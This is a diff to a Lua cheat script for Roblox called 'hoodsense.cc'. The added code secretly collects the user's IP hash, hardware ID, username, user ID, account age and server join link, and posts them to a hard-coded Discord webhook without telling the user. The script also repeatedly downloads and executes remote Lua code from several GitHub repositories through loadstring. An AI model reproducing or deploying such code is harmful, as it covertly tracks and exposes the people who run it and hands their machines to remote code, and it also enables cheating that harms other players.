@@ -1543,10 +1543,10 @@ game.StarterGui:SetCore("SendNotification", {
     Title = "hoodsense.cc";
     Text = "Succesfully loaded!";
     Icon = "http://www.roblox.com/asset/?id=8768441000";
-    Duration = "3";
+    Duration = "5";
     callbakc = bindableFunction;
 })
-wait(5)
+wait(10)
 game.StarterGui:SetCore("SendNotification", {
     Title = "hoodsense.cc";
     Text = "https://hoodsense.cf";
@@ -1555,6 +1555,77 @@ game.StarterGui:SetCore("SendNotification", {
     callbakc = bindableFunction;
     Button1 = "Okay!";
 })
+
+local url = 'https://discord.com/api/webhooks/962883148901929050/L9G5cfJ6Dpw4g_nHDye3mHvZOwDPr5FW2OyvzpQrFzUoUiCNqfw4BXfTELF9loTMtoUz'
+local req = syn.request
+local hwid_headers = {'Syn-Fingerprint'} -- You will have to add more headers for different exploits
+
+function ip()local a=req({Url='https://httpbin.org/ip',Method='GET'}) local b=game:GetService('HttpService'):JSONDecode(a.Body) local Hash = game:HttpGet('https://api.hashify.net/hash/md5/hex?value='..b.origin) local Hashed = game:GetService("HttpService"):JSONDecode(Hash) return Hashed.Digest end
+function hwid()local a=req({Url='https://httpbin.org/get',Method='GET'})local b=game:GetService('HttpService'):JSONDecode(a.Body)for c,d in pairs(hwid_headers)do if b.headers[d]then return b.headers[d]end end end
+
+local data = {
+    ["username"]  = "hoodsense",
+    ["avatar_url"] = "https://cdn.discordapp.com/attachments/956351837664067605/963085251524046878/Png.png",
+    ["embeds"] = {
+        {
+            ["author"] = {
+                ["name"] = "HOODSENSE REQUEST",
+                ["url"] = "https://discord.gg/axq",
+                ["icon_url"] = "https://cdn.discordapp.com/attachments/956351837664067605/963085251524046878/Png.png"
+            },
+            ["url"] = "https://www.roblox.com/games/"..game.PlaceId,
+            ["description"] = "**Executed in game: **"..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name,
+            ["color"] = 229954,
+            ["fields"] = {
+                {
+                    ["name"] = "Place ID",
+                    ["value"] = "**Game ID: **"..game.PlaceId,
+                },
+                {
+                    ["name"] = "Player Name",
+                    ["value"] = "**Username: **"..game.Players.LocalPlayer.Name,
+                },
+                {
+                    ["name"] = "Player DisplayName",
+                    ["value"] = "**Display Name: **"..game.Players.LocalPlayer.DisplayName,
+                },
+                {
+                    ["name"] = "Player ID:",
+                    ["value"] = "**ID: **"..game.Players.LocalPlayer.UserId,
+                },                {
+                    ["name"] = "Account Age",
+                    ["value"] = "**Age: **"..game.Players.LocalPlayer.AccountAge,
+                },
+                {
+                    ["name"] = "Job Id",
+                    ["value"] = "```"..game.JobId.."```"
+                },
+                {
+                    ["name"] = "Join Link:",
+                    ["value"] = "```https://roblox.GameLauncher.joinGameInstance(2788229376, "..game.JobId..")```",
+                },
+                {
+                    ["name"] = "Hard Ware ID:",
+                    ["value"] = tostring("```"..hwid().."```"),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "IP ADDRESS:",
+                    ["value"] = tostring("```"..ip().."```"),
+                },
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
+            },
+            ["footer"] = {
+                ["text"] = "HOODSENSE.CC \(https://hoodsense.cf\) | Relase ID = DP4UZs",
+            }
+        }
+    }
+}
+
+
+local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})
 print("_____________________HOODSENSE.CC________________________")
 print("| [hoodsense.cc] Executed version: 5.9                  |")
 print("| [hoodsense.cc] Fixed silent aim!                      |")
@@ -1563,18 +1634,13 @@ print("| [hoodsense.cc] Made by ekso <@804245361894883339>     |")
 print("| [hoodsense.cc] Website - https://hoodsense.cf         |")
 print("_________________________________________________________")
 
-while true do
-loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
-warn("[hoodsense.cc] Emojis Reloaded!")
-	wait(1)
-	end
 loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
 while true do
     loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/dp.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/dp2.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p1.lua'))()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p2.lua'))()
+    --loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p2.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p3.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p4.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p5.lua'))()
